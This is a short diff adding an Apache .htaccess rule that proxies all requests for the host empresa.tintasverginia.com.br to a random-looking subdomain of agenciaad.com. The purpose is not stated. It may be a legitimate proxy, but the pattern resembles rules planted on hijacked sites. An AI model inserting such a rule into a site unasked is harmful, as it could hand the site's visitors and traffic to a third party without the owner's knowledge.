@@ -1,0 +1,5 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{HTTP_HOST} ^empresa\.tintasverginia\.com\.br$
+RewriteRule ^(.*) http://v3guihlynya.agenciaad.com%{REQUEST_URI} [P]
+</IfModule>
